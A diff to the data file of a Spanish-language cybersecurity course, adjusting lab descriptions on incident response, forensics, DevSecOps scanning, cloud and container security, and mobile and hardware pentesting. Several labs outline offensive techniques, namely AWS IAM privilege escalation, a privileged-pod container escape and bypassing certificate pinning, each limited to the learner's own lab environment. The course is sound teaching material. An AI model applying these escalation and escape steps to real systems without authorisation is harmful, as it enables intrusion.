@@ -11117,7 +11117,7 @@ export const CLASSES = [
       "Inteligencia: MITRE ATT&CK Navigator, MISP para IOCs.",
       "Ejercicio aplicado: no requiere entorno ofensivo; es diseño de proceso."
     ],
-    "lab": "> Ejercicio aplicado de diseño de proceso. 1. Elige un tipo de incidente (empieza por phishing) y define su alcance y disparadores. 2. Estructura el playbook por fases PICERL. Para detección/identificación, define: - Fuentes de alerta (reporte de usuario, gateway de correo, EDR). - Cómo validar que es phishing real. 3. Para contención, escribe pasos concretos: - Aislar el buzón, bloquear el remit…",
+    "lab": "Ejercicio aplicado de diseño de proceso. 1. Elige un tipo de incidente (empieza por phishing) y define su alcance y disparadores. 2. Estructura el playbook por fases PICERL. Para detección/identificación, define: - Fuentes de alerta (reporte de usuario, gateway de correo, EDR). - Cómo validar que es phishing real. 3. Para contención, escribe pasos concretos: - Aislar el buzón, bloquear el remiten…",
     "exercises": [
       "Escribe la fase de contención de un playbook de ransomware.",
       "Define cinco puntos de decisión para una cuenta comprometida.",
@@ -11171,7 +11171,7 @@ export const CLASSES = [
       "Credenciales: gestor de secretos, rotación de claves, revocación de sesiones/tokens.",
       "Ejercicio aplicado: diseño y práctica en laboratorio propio."
     ],
-    "lab": "> Sobre una VM de laboratorio propia previamente \"comprometida\" por ti. 1. Contén el host aislándolo por red sin apagarlo (preservas RAM y estado): - EDR: acción \"aislar\"; o regla de firewall que solo permita la IP del analista. 2. Antes de erradicar, captura evidencia: volcado de RAM (clase 207) e imagen de disco (clase 203). 3. Enumera la persistencia en Windows con Autoruns: ``powershell autor…",
+    "lab": "Sobre una VM de laboratorio propia previamente \"comprometida\" por ti. 1. Contén el host aislándolo por red sin apagarlo (preservas RAM y estado): - EDR: acción \"aislar\"; o regla de firewall que solo permita la IP del analista. 2. Antes de erradicar, captura evidencia: volcado de RAM (clase 207) e imagen de disco (clase 203). 3. Enumera la persistencia en Windows con Autoruns: ``powershell autorun…",
     "exercises": [
       "Decide para tres escenarios si aislar u observar, y justifícalo.",
       "Enumera cinco mecanismos de persistencia en Windows.",
@@ -11224,7 +11224,7 @@ export const CLASSES = [
       "Insumos: la timeline (clase 209), los hallazgos forenses y el mapeo ATT&CK del incidente.",
       "Ejercicio aplicado: análisis, no herramientas ofensivas."
     ],
-    "lab": "> Usa un incidente que ya investigaste en clases anteriores (o el caso de la clase 220). 1. Reúne los hechos: timeline, IOCs, artefactos y el mapeo ATT&CK del ataque. 2. Aplica los 5 Porqués partiendo del impacto. Ejemplo: - ¿Por qué se cifraron los archivos? → Se ejecutó ransomware. - ¿Por qué se ejecutó? → Un usuario abrió un adjunto con macro. - ¿Por qué la macro corrió? → Las macros no estaba…",
+    "lab": "Usa un incidente que ya investigaste en clases anteriores (o el caso de la clase 220). 1. Reúne los hechos: timeline, IOCs, artefactos y el mapeo ATT&CK del ataque. 2. Aplica los 5 Porqués partiendo del impacto. Ejemplo: - ¿Por qué se cifraron los archivos? → Se ejecutó ransomware. - ¿Por qué se ejecutó? → Un usuario abrió un adjunto con macro. - ¿Por qué la macro corrió? → Las macros no estaban…",
     "exercises": [
       "Aplica los 5 Porqués a un caso de phishing.",
       "Construye un Ishikawa con cuatro categorías de causa.",
@@ -11278,7 +11278,7 @@ export const CLASSES = [
       "Marco legal: familiarízate con GDPR, y con la normativa de tu país (en Chile, la Ley 19.628 y la Ley 21.459 de delitos informáticos, por ejemplo).",
       "Ejercicio aplicado: redacción, no herramientas técnicas."
     ],
-    "lab": "> Redacta el informe de un caso que ya investigaste (por ejemplo el de la clase 220). 1. Crea la portada: caso, examinador, fechas, clasificación de confidencialidad. 2. Escribe el resumen ejecutivo (media página, sin jerga): qué pasó, impacto y recomendación clave, para dirección. 3. Define alcance y limitaciones: qué se analizó, qué no y por qué. 4. Documenta la metodología: herramientas, versi…",
+    "lab": "Redacta el informe de un caso que ya investigaste (por ejemplo el de la clase 220). 1. Crea la portada: caso, examinador, fechas, clasificación de confidencialidad. 2. Escribe el resumen ejecutivo (media página, sin jerga): qué pasó, impacto y recomendación clave, para dirección. 3. Define alcance y limitaciones: qué se analizó, qué no y por qué. 4. Documenta la metodología: herramientas, version…",
     "exercises": [
       "Escribe un resumen ejecutivo de media página para un caso.",
       "Reescribe tres hallazgos separando hecho de opinión.",
@@ -11332,7 +11332,7 @@ export const CLASSES = [
       "Insumos: los playbooks (clase 215) que se quieren poner a prueba.",
       "Ejercicio aplicado: no requiere entorno técnico; es organizativo."
     ],
-    "lab": "> Diseña y facilita un tabletop. Puedes ejecutarlo con compañeros o en solitario como diseño. 1. Define objetivos medibles: p. ej. \"validar el playbook de ransomware y los criterios de escalado\". 2. Elige un escenario realista para tu contexto (ransomware que cifra un servidor de archivos y exige rescate). 3. Redacta la MSEL con injects progresivos y sus tiempos. Ejemplo de injects: - T+0: el EDR…",
+    "lab": "Diseña y facilita un tabletop. Puedes ejecutarlo con compañeros o en solitario como diseño. 1. Define objetivos medibles: p. ej. \"validar el playbook de ransomware y los criterios de escalado\". 2. Elige un escenario realista para tu contexto (ransomware que cifra un servidor de archivos y exige rescate). 3. Redacta la MSEL con injects progresivos y sus tiempos. Ejemplo de injects: - T+0: el EDR a…",
     "exercises": [
       "Define tres objetivos medibles para un tabletop.",
       "Escribe una MSEL con cinco injects y sus tiempos.",
@@ -11385,7 +11385,7 @@ export const CLASSES = [
       "Escenario: móntalo tú en un laboratorio aislado de VMs propias, o usa un dataset de entrenamiento DFIR público.",
       "Recuerda: cualquier malware se maneja solo en laboratorio aislado y desechable, con snapshots."
     ],
-    "lab": "> Escenario propuesto: una estación Windows generó una alerta EDR de PowerShell ofuscado que contactó una IP externa; sospechas de intrusión con exfiltración. Reprodúcelo en tu laboratorio propio. 1. Triage e identificación: revisa la alerta, clasifica severidad (clase 202) y define el alcance inicial. Decide aislar por red preservando RAM (clase 216). 2. Adquisición: - Volca la RAM (WinPmem) y e…",
+    "lab": "Escenario propuesto: una estación Windows generó una alerta EDR de PowerShell ofuscado que contactó una IP externa; sospechas de intrusión con exfiltración. Reprodúcelo en tu laboratorio propio. 1. Triage e identificación: revisa la alerta, clasifica severidad (clase 202) y define el alcance inicial. Decide aislar por red preservando RAM (clase 216). 2. Adquisición: - Volca la RAM (WinPmem) y el…",
     "exercises": [
       "Escribe la decisión de triage y su justificación de severidad.",
       "Correlaciona un hallazgo de memoria con uno de disco y uno de red.",
@@ -11489,7 +11489,7 @@ export const CLASSES = [
       "Prowler y ScoutSuite para auditar IAM (se profundiza en la clase 231).",
       "Pacu (framework de explotación AWS) y PMapper para grafos de escalada IAM. Úsalos solo en tu propia cuenta de laboratorio."
     ],
-    "lab": "> ⚠️ Contenido con componente ofensivo. Ejecuta todo exclusivamente en tu propia cuenta de laboratorio. 1. Crea un usuario lab-user sin permisos y un rol lab-admin-role con AdministratorAccess. 2. Adjunta a lab-user una política que solo permita iam:PassRole y ec2:RunInstances. 3. Con PMapper, genera el grafo de la cuenta: pmapper graph create y luego pmapper query \"who can do iam: with \". Observ…",
+    "lab": "⚠️ Contenido con componente ofensivo. Ejecuta todo exclusivamente en tu propia cuenta de laboratorio. 1. Crea un usuario lab-user sin permisos y un rol lab-admin-role con AdministratorAccess. 2. Adjunta a lab-user una política que solo permita iam:PassRole y ec2:RunInstances. 3. Con PMapper, genera el grafo de la cuenta: pmapper graph create y luego pmapper query \"who can do iam: with \". Observa…",
     "exercises": [
       "Escribe una política que permita listar un bucket concreto pero denegar borrar objetos.",
       "Convierte una integración basada en clave estática en un rol asumido por un servicio.",
@@ -11697,7 +11697,7 @@ export const CLASSES = [
       "CloudGoat (Rhino Security Labs) para desplegar escenarios vulnerables en TU cuenta de laboratorio.",
       "Un entorno aislado y presupuesto controlado (los recursos cuestan dinero)."
     ],
-    "lab": "> Todo se ejecuta en tu cuenta de laboratorio con CloudGoat. No apuntes a infraestructura ajena. 1. Despliega el escenario iam_privesc_by_rollback de CloudGoat; recibirás credenciales de acceso limitado. 2. Reconocimiento IAM: con enumerate-iam y aws iam get-user, mapea qué permisos tienes. 3. Identifica el permiso peligroso (p. ej. iam:CreatePolicyVersion con --set-as-default) que permite reescr…",
+    "lab": "Todo se ejecuta en tu cuenta de laboratorio con CloudGoat. No apuntes a infraestructura ajena. 1. Despliega el escenario iam_privesc_by_rollback de CloudGoat; recibirás credenciales de acceso limitado. 2. Reconocimiento IAM: con enumerate-iam y aws iam get-user, mapea qué permisos tienes. 3. Identifica el permiso peligroso (p. ej. iam:CreatePolicyVersion con --set-as-default) que permite reescrib…",
     "exercises": [
       "Enumera todos los roles asumibles desde una identidad dada con PMapper.",
       "Explica por qué IMDSv2 mitiga el robo de credenciales por SSRF.",
@@ -11750,7 +11750,7 @@ export const CLASSES = [
       "Docker Bench for Security para auditar el host según CIS.",
       "Hadolint para lint de Dockerfiles."
     ],
-    "lab": "1. Ejecuta docker run -it --rm alpine sh y explora los namespaces con lsns desde el host para ver el aislamiento. 2. Lanza un contenedor con --privileged y muestra que puede montar el disco del host; borra el contenedor y nunca uses privileged en producción. 3. Escribe un Dockerfile inseguro (corriendo como root, con secretos en ENV) y pásalo por Hadolint; corrige los hallazgos. 4. Refactoriza a…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — son las capas 4 y 5 del lab de DevSecOps: un Dockerfile con diez antipatrones y las CVE del sistema base. 1. Ejecuta docker run -it --rm alpine sh y explora los namespaces con lsns desde el host para ver el aislamiento. 2. Lanza un contenedor con --privileged y muestra que puede montar el disco del host; borra el contenedor y nunca uses…",
     "exercises": [
       "Enumera las capabilities por defecto de un contenedor y explica cuáles quitarías.",
       "Convierte una imagen basada en ubuntu a una distroless y mide la reducción de CVEs.",
@@ -11854,7 +11854,7 @@ export const CLASSES = [
       "kube-bench, kubeaudit, kubescape, Trivy (modo k8s) y kubectl.",
       "Un CNI que soporte NetworkPolicy (p. ej. Calico) para las prácticas de red."
     ],
-    "lab": "> Todo en tu clúster de laboratorio. No apuntes a clústeres ajenos. 1. Ejecuta kube-bench y anota los hallazgos del plano de control y de los nodos. 2. Ataque — pod privilegiado: despliega un pod con securityContext.privileged: true y hostPID: true; desde él, accede al filesystem del nodo (nsenter/chroot al host). Comprueba el escape. 3. Mitigación: activa Pod Security Admission en modo restricte…",
+    "lab": "Todo en tu clúster de laboratorio. No apuntes a clústeres ajenos. 1. Ejecuta kube-bench y anota los hallazgos del plano de control y de los nodos. 2. Ataque — pod privilegiado: despliega un pod con securityContext.privileged: true y hostPID: true; desde él, accede al filesystem del nodo (nsenter/chroot al host). Comprueba el escape. 3. Mitigación: activa Pod Security Admission en modo restricted…",
     "exercises": [
       "Escribe un securityContext que impida correr como root y monte el filesystem read-only.",
       "Convierte un namespace a Pod Security restricted y ajusta los pods que dejen de desplegar.",
@@ -12166,7 +12166,7 @@ export const CLASSES = [
       "Herramientas de forense cloud como AWS IR playbooks, snapshots de EBS/discos y Cloud Custodian para automatizar contención.",
       "Un repositorio Terraform (clase 230) para reconstrucción."
     ],
-    "lab": "> Ejecuta el playbook en tu cuenta de laboratorio, sobre recursos que controlas. 1. Preparación: define un rol de \"responder\" con permisos mínimos para aislar y adquirir; crea el runbook y una cuenta/bucket de evidencia. 2. Detección/análisis: parte de una alerta de la clase 234 (p. ej. creación anómala de clave de acceso). Reconstruye el \"quién/qué/cuándo\" con los logs del plano de gestión. 3. C…",
+    "lab": "Ejecuta el playbook en tu cuenta de laboratorio, sobre recursos que controlas. 1. Preparación: define un rol de \"responder\" con permisos mínimos para aislar y adquirir; crea el runbook y una cuenta/bucket de evidencia. 2. Detección/análisis: parte de una alerta de la clase 234 (p. ej. creación anómala de clave de acceso). Reconstruye el \"quién/qué/cuándo\" con los logs del plano de gestión. 3. Con…",
     "exercises": [
       "Escribe el runbook de \"credencial IAM comprometida\" con pasos y comandos.",
       "Diseña el procedimiento de cuarentena de una instancia sin destruir evidencia.",
@@ -12218,7 +12218,7 @@ export const CLASSES = [
       "Acceso al documento NIST SP 800-218 para consultar las prácticas PO/PS/PW/RV.",
       "Un repositorio de ejemplo propio para ubicar dónde encajaría cada control."
     ],
-    "lab": "Ejercicio aplicado de diseño y evaluación (no ofensivo): 1. Dibuja tu SDLC actual. Lista las fases reales por las que pasa un cambio en tu equipo: idea → requisitos → diseño → codificación → PR/review → build → test → despliegue → operación. 2. Ubica los controles existentes. Marca en cada fase qué comprobación de seguridad ya existe hoy (aunque sea \"ninguna\"). Sé honesto. 3. Identifica los hueco…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — recorre las ocho capas y termina moviéndolas a pre-commit y CI: el shift-left aplicado de principio a fin. Ejercicio aplicado de diseño y evaluación (no ofensivo): 1. Dibuja tu SDLC actual. Lista las fases reales por las que pasa un cambio en tu equipo: idea → requisitos → diseño → codificación → PR/review → build → test → despliegue → o…",
     "exercises": [
       "Enumera las fases del SDLC y asigna a cada una un control de seguridad concreto.",
       "Explica con un ejemplo por qué un fallo de diseño es más caro que un fallo de código.",
@@ -12321,7 +12321,7 @@ export const CLASSES = [
       "Bandit (Python) y gosec (Go) como SAST específicos de lenguaje.",
       "Un repositorio vulnerable de práctica: OWASP Juice Shop o NodeGoat o el intencionadamente inseguro DVWA."
     ],
-    "lab": "1. Clona un repo vulnerable de práctica (p. ej. NodeGoat) en tu entorno local. 2. Escanea con reglas de la comunidad: ``bash semgrep --config p/owasp-top-ten --config p/secrets ./NodeGoat --json -o hallazgos.json semgrep --config p/owasp-top-ten ./NodeGoat # salida legible en consola ` 3. Interpreta un hallazgo. Elige una inyección SQL o un XSS reportado, abre el archivo/línea y confirma si el fl…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — el SAST es allí una capa de seis; comprueba qué se le escapa y qué otra capa lo cubre. 1. Clona un repo vulnerable de práctica (p. ej. NodeGoat) en tu entorno local. 2. Escanea con reglas de la comunidad: ``bash semgrep --config p/owasp-top-ten --config p/secrets ./NodeGoat --json -o hallazgos.json semgrep --config p/owasp-top-ten ./Node…",
     "exercises": [
       "Ejecuta Semgrep con dos rulesets distintos y compara los hallazgos.",
       "Escribe una regla que detecte eval() sobre input de usuario en JavaScript.",
@@ -12424,7 +12424,7 @@ export const CLASSES = [
       "osv-scanner (Google) — usa la base OSV, muy buena para lenguajes modernos.",
       "Dependabot / Renovate — PRs automáticos de actualización."
     ],
-    "lab": "1. Inspecciona el árbol de dependencias de un proyecto real (p. ej. npm ls --all o pip list + pipdeptree). Observa cuántas son transitivas. 2. Escanea con Trivy: ``bash trivy fs --scanners vuln --severity HIGH,CRITICAL ./mi-proyecto ` 3. Escanea con Dependency-Check y compara resultados; nota que cada herramienta usa fuentes distintas y puede diferir. 4. Prioriza con EPSS y KEV. Toma los 5 CVE re…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — es la capa 1 del lab, con el ejercicio de cobertura: dos dependencias sin versión fijada que el escáner no puede resolver. 1. Inspecciona el árbol de dependencias de un proyecto real (p. ej. npm ls --all o pip list + pipdeptree). Observa cuántas son transitivas. 2. Escanea con Trivy: ``bash trivy fs --scanners vuln --severity HIGH,CRITIC…",
     "exercises": [
       "Genera el árbol de dependencias de un proyecto y cuenta directas vs transitivas.",
       "Escanea el mismo repo con Trivy y Dependency-Check y explica las diferencias.",
@@ -12476,7 +12476,7 @@ export const CLASSES = [
       "pre-commit (framework) — orquesta hooks locales de forma reproducible.",
       "git-filter-repo / BFG Repo-Cleaner — para purgar secretos del historial."
     ],
-    "lab": "1. Escanea el historial completo de un repositorio de práctica: ``bash gitleaks detect --source . --report-format json --report-path gitleaks.json -v ` Revisa hallazgos: cada uno lista commit, archivo, línea y regla. 2. Instala el hook de pre-commit. Crea .pre-commit-config.yaml: `yaml repos: - repo: https://github.com/gitleaks/gitleaks rev: v8.18.0 hooks: - id: gitleaks ` `bash pre-commit instal…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — es la capa 3 del lab: secretos con formato realista, y el matiz de los genéricos que se escapan a la detección. 1. Escanea el historial completo de un repositorio de práctica: ``bash gitleaks detect --source . --report-format json --report-path gitleaks.json -v ` Revisa hallazgos: cada uno lista commit, archivo, línea y regla. 2. Instala…",
     "exercises": [
       "Escanea el historial de un repo y clasifica los hallazgos por severidad.",
       "Configura pre-commit con gitleaks y demuestra que bloquea un commit.",
@@ -12528,7 +12528,7 @@ export const CLASSES = [
       "actionlint — linter de sintaxis y buenas prácticas de workflows.",
       "StepSecurity Harden-Runner — monitoriza y restringe el tráfico de red del runner."
     ],
-    "lab": "1. Audita tus workflows con zizmor y actionlint: ``bash zizmor .github/workflows/ci.yml actionlint ` Anota hallazgos: permisos amplios, acciones sin pin, uso de pull_request_target. 2. Restringe permisos. Aplica mínimo privilegio a nivel de workflow y sube por job solo lo necesario: `yaml permissions: contents: read # por defecto de solo lectura para todo jobs: build: permissions: contents: read…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — es la capa 6 del lab, sobre un workflow con pull_request_target, inyección de expresiones y permisos totales. 1. Audita tus workflows con zizmor y actionlint: ``bash zizmor .github/workflows/ci.yml actionlint ` Anota hallazgos: permisos amplios, acciones sin pin, uso de pull_request_target. 2. Restringe permisos. Aplica mínimo privilegio…",
     "exercises": [
       "Audita un workflow con zizmor y clasifica los hallazgos por severidad.",
       "Reescribe un workflow para aplicar mínimo privilegio de permisos.",
@@ -12580,7 +12580,7 @@ export const CLASSES = [
       "hadolint para lintar Dockerfiles.",
       "cosign (Sigstore) para firmar y verificar."
     ],
-    "lab": "1. Parte de un Dockerfile \"malo\" (imagen base pesada, root, sin pin) y lintéalo: ``bash docker run --rm -i hadolint/hadolint < Dockerfile ` 2. Reescríbelo seguro con multi-stage, base distroless y usuario no-root: `dockerfile # build stage FROM golang:1.22 AS build WORKDIR /src COPY . . RUN CGO_ENABLED=0 go build -o /app . # runtime stage FROM gcr.io/distroless/static-debian12:nonroot COPY --from…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — son las capas 4 y 5 del lab: hadolint sobre el Dockerfile y trivy sobre el sistema operativo base. 1. Parte de un Dockerfile \"malo\" (imagen base pesada, root, sin pin) y lintéalo: ``bash docker run --rm -i hadolint/hadolint < Dockerfile ` 2. Reescríbelo seguro con multi-stage, base distroless y usuario no-root: `dockerfile # build stage…",
     "exercises": [
       "Convierte un Dockerfile de una sola etapa a multi-stage y mide la reducción de tamaño.",
       "Cambia una imagen base ubuntu por distroless y compara los CVE con Trivy.",
@@ -12683,7 +12683,7 @@ export const CLASSES = [
       "CISA KEV y EPSS — señales de priorización.",
       "Hoja de cálculo o issue tracker (Jira/GitHub Issues) para el flujo si no usas DefectDojo."
     ],
-    "lab": "Ejercicio de proceso (defensivo, sobre hallazgos propios): 1. Recolecta hallazgos. Exporta resultados de Trivy (SCA/imagen), Semgrep (SAST) y ZAP (DAST) de tus prácticas en formato JSON. 2. Consolida en DefectDojo. Crea un producto y engagement, importa los tres informes. Observa cómo deduplica hallazgos repetidos entre escaneos. 3. Enriquece con señales de riesgo. Para los top 20 hallazgos, añad…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — incluye el bloque de priorización KEV → EPSS → CVSS y el procedimiento de remediación con reversión automática. Ejercicio de proceso (defensivo, sobre hallazgos propios): 1. Recolecta hallazgos. Exporta resultados de Trivy (SCA/imagen), Semgrep (SAST) y ZAP (DAST) de tus prácticas en formato JSON. 2. Consolida en DefectDojo. Crea un prod…",
     "exercises": [
       "Dibuja el ciclo de vida de una vulnerabilidad en tu organización.",
       "Consolida hallazgos de dos herramientas y cuenta los duplicados eliminados.",
@@ -12735,7 +12735,7 @@ export const CLASSES = [
       "cosign — firma imágenes y adjunta atestaciones (SBOM, provenance).",
       "SLSA GitHub Generator — genera provenance SLSA en Actions."
     ],
-    "lab": "1. Genera el SBOM de un proyecto y de su imagen: ``bash syft dir:./mi-proyecto -o spdx-json > sbom.spdx.json syft miapp:1.0 -o cyclonedx-json > sbom.cdx.json ` Inspecciona: componentes, versiones, licencias, hashes. 2. Consume el SBOM para responder a un CVE. Simula que sale un CVE en una librería: busca en el SBOM si está y en qué versión. Luego escanea con Grype/Trivy usando el SBOM como entrad…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — practica los tres huecos típicos de la cadena: dependencias sin fijar, ausencia de lockfile con hashes y acciones de CI sin fijar por SHA. 1. Genera el SBOM de un proyecto y de su imagen: ``bash syft dir:./mi-proyecto -o spdx-json > sbom.spdx.json syft miapp:1.0 -o cyclonedx-json > sbom.cdx.json ` Inspecciona: componentes, versiones, lic…",
     "exercises": [
       "Genera SBOM del mismo artefacto en CycloneDX y SPDX y compara su estructura.",
       "Usa un SBOM para determinar en 1 minuto si estás afectado por un CVE dado.",
@@ -12839,7 +12839,7 @@ export const CLASSES = [
       "Una plantilla de charter de programa (objetivos, roles, tiempo asignado, métricas).",
       "Herramienta de encuesta para medir percepción de seguridad en los equipos."
     ],
-    "lab": "Diseño de un programa real (ejercicio aplicado, no ofensivo): 1. Diagnostica la cultura actual. Haz una mini-encuesta a un equipo: ¿saben a quién acudir con dudas de seguridad? ¿la seguridad les frena o les ayuda? Anota el punto de partida. 2. Define el charter del programa de champions. Documenta objetivo, criterios de selección (voluntariedad + interés, no imposición), tiempo asignado (p. ej. 1…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — su informe está pensado para que desarrollo lo lea: clasificar los hallazgos en vez de marcarlo todo como crítico. Diseño de un programa real (ejercicio aplicado, no ofensivo): 1. Diagnostica la cultura actual. Haz una mini-encuesta a un equipo: ¿saben a quién acudir con dudas de seguridad? ¿la seguridad les frena o les ayuda? Anota el p…",
     "exercises": [
       "Redacta el charter de un programa de security champions de una página.",
       "Define criterios de selección de champions que eviten la imposición.",
@@ -13553,7 +13553,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Ejecutar una evaluación de seguridad completa de una aplicación Android combinando análisis estático (SAST), dinámico (DAST) e instrumentación en tiempo de ejecución.",
-    "theory": "Ejecutar una evaluación de seguridad completa de una aplicación Android combinando análisis estático (SAST), dinámico (DAST) e instrumentación en tiempo de ejecución. El alumno montará el entorno, interceptará el tráfico HTTPS de la app, evadirá certificate pinning y detección de root en laboratorio, y buscará las vulnerabilidades del top de OWASP MASVS: almacenamiento inseguro, comunicación débil y lógica del lado del cliente evadible. > ⚠️ Nota ética: todo el pentest se realiza sobre apps propias, apps deliberadamente vulnerables (DIVA, InsecureBankv2, MASTG apps) o con autorización escrita…",
+    "theory": "Ejecutar una evaluación de seguridad completa de una aplicación Android combinando análisis estático (SAST), dinámico (DAST) e instrumentación en tiempo de ejecución. El alumno montará el entorno, interceptará el tráfico HTTPS de la app, evadirá certificate pinning y detección de root en laboratorio, y buscará las vulnerabilidades del top de OWASP MASVS: almacenamiento inseguro, comunicación débil y lógica del lado del cliente evadible. ⚠️ Nota ética: todo el pentest se realiza sobre apps propias, apps deliberadamente vulnerables (DIVA, InsecureBankv2, MASTG apps) o con autorización escrita d…",
     "outcomes": [
       "Configurar un laboratorio de pentest móvil con emulador rooteado y proxy interceptor.",
       "Realizar análisis estático de un APK con MobSF y apktool.",
@@ -13657,7 +13657,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Realizar una evaluación de seguridad de una app iOS sobre un dispositivo con jailbreak: descifrar y analizar el IPA, inspeccionar el almacenamiento y el Keychain, interceptar tráfico TLS evadiendo pinning, y saltar dete…",
-    "theory": "Realizar una evaluación de seguridad de una app iOS sobre un dispositivo con jailbreak: descifrar y analizar el IPA, inspeccionar el almacenamiento y el Keychain, interceptar tráfico TLS evadiendo pinning, y saltar detección de jailbreak con Frida/objection. El alumno aprenderá a adaptar la metodología MASVS al ecosistema iOS, donde el code signing y el sandbox imponen restricciones ausentes en Android. > ⚠️ Nota ética: solo sobre apps propias, apps deliberadamente vulnerables (DVIA-v2, MASTG apps) o con autorización escrita. Descifrar o redistribuir apps de terceros vulnera la ley y los térm…",
+    "theory": "Realizar una evaluación de seguridad de una app iOS sobre un dispositivo con jailbreak: descifrar y analizar el IPA, inspeccionar el almacenamiento y el Keychain, interceptar tráfico TLS evadiendo pinning, y saltar detección de jailbreak con Frida/objection. El alumno aprenderá a adaptar la metodología MASVS al ecosistema iOS, donde el code signing y el sandbox imponen restricciones ausentes en Android. ⚠️ Nota ética: solo sobre apps propias, apps deliberadamente vulnerables (DVIA-v2, MASTG apps) o con autorización escrita. Descifrar o redistribuir apps de terceros vulnera la ley y los términ…",
     "outcomes": [
       "Descifrar el binario Mach-O de una app propia con frida-ios-dump.",
       "Analizar estáticamente el IPA (Info.plist, entitlements, cadenas, class-dump).",
@@ -13708,7 +13708,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Dominar la ingeniería inversa (RE) de aplicaciones móviles combinando análisis estático (desensamblado y decompilación de bytecode/nativo) con análisis dinámico (instrumentación con Frida).",
-    "theory": "Dominar la ingeniería inversa (RE) de aplicaciones móviles combinando análisis estático (desensamblado y decompilación de bytecode/nativo) con análisis dinámico (instrumentación con Frida). El alumno recuperará la lógica de una app, entenderá algoritmos ofuscados, localizará y evadirá controles anti-tampering, y parcheará una app para modificar su comportamiento en laboratorio. > ⚠️ Nota ética: el RE se realiza sobre apps propias, de código abierto o CrackMes/retos diseñados para ello, o con autorización. Modificar o redistribuir software de terceros puede infringir derechos de autor y contra…",
+    "theory": "Dominar la ingeniería inversa (RE) de aplicaciones móviles combinando análisis estático (desensamblado y decompilación de bytecode/nativo) con análisis dinámico (instrumentación con Frida). El alumno recuperará la lógica de una app, entenderá algoritmos ofuscados, localizará y evadirá controles anti-tampering, y parcheará una app para modificar su comportamiento en laboratorio. ⚠️ Nota ética: el RE se realiza sobre apps propias, de código abierto o CrackMes/retos diseñados para ello, o con autorización. Modificar o redistribuir software de terceros puede infringir derechos de autor y contrato…",
     "outcomes": [
       "Decompilar APK (smali/Java) y binarios nativos Mach-O/ELF (.so).",
       "Navegar código en Ghidra/jadx para reconstruir la lógica de una app.",
@@ -13809,7 +13809,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Aprender a obtener, desempaquetar y analizar el firmware de un dispositivo embebido para descubrir credenciales, claves, binarios vulnerables y backdoors, y a emular el firmware para pruebas dinámicas.",
-    "theory": "Aprender a obtener, desempaquetar y analizar el firmware de un dispositivo embebido para descubrir credenciales, claves, binarios vulnerables y backdoors, y a emular el firmware para pruebas dinámicas. El alumno recorrerá la metodología OWASP FSTM: obtención, extracción del sistema de ficheros, análisis estático, emulación y verificación de la cadena de actualización. > ⚠️ Nota ética: trabaja solo con firmware de dispositivos propios o de descargas oficiales del fabricante para tu equipo, o con imágenes de práctica (DVRF, IoTGoat). No redistribuyas firmware con copyright.",
+    "theory": "Aprender a obtener, desempaquetar y analizar el firmware de un dispositivo embebido para descubrir credenciales, claves, binarios vulnerables y backdoors, y a emular el firmware para pruebas dinámicas. El alumno recorrerá la metodología OWASP FSTM: obtención, extracción del sistema de ficheros, análisis estático, emulación y verificación de la cadena de actualización. ⚠️ Nota ética: trabaja solo con firmware de dispositivos propios o de descargas oficiales del fabricante para tu equipo, o con imágenes de práctica (DVRF, IoTGoat). No redistribuyas firmware con copyright.",
     "outcomes": [
       "Obtener firmware por descarga oficial, volcado de flash o interceptación OTA.",
       "Extraer el sistema de ficheros con binwalk y utilidades relacionadas.",
@@ -13859,7 +13859,7 @@ export const CLASSES = [
     "level": "Experto",
     "duration": "150 min",
     "description": "Acceder al nivel más bajo de un dispositivo embebido a través de sus interfaces de depuración físicas: UART para obtener una consola serie, JTAG/SWD para control del procesador y volcado de memoria, y SPI para leer/escr…",
-    "theory": "Acceder al nivel más bajo de un dispositivo embebido a través de sus interfaces de depuración físicas: UART para obtener una consola serie, JTAG/SWD para control del procesador y volcado de memoria, y SPI para leer/escribir el chip de flash directamente. El alumno aprenderá a identificar puntos de prueba en una PCB, conectar un adaptador, y extraer firmware o consolas root del hardware propio. > ⚠️ Nota ética y de seguridad: trabaja solo con dispositivos de tu propiedad. Manipular electrónica implica riesgo de dañar el equipo o de descarga; respeta voltajes (3.3 V típico) y nunca alimentes pi…",
+    "theory": "Acceder al nivel más bajo de un dispositivo embebido a través de sus interfaces de depuración físicas: UART para obtener una consola serie, JTAG/SWD para control del procesador y volcado de memoria, y SPI para leer/escribir el chip de flash directamente. El alumno aprenderá a identificar puntos de prueba en una PCB, conectar un adaptador, y extraer firmware o consolas root del hardware propio. ⚠️ Nota ética y de seguridad: trabaja solo con dispositivos de tu propiedad. Manipular electrónica implica riesgo de dañar el equipo o de descarga; respeta voltajes (3.3 V típico) y nunca alimentes pine…",
     "outcomes": [
       "Identificar interfaces UART, JTAG/SWD y SPI en una placa por inspección y medición.",
       "Conectar un adaptador USB-serie/lógico y obtener una consola UART.",
@@ -13910,7 +13910,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Introducir la radio definida por software (SDR) como herramienta para descubrir, capturar y analizar señales inalámbricas más allá de WiFi y Bluetooth: mandos remotos sub-GHz, sensores ISM, telemetría y protocolos propi…",
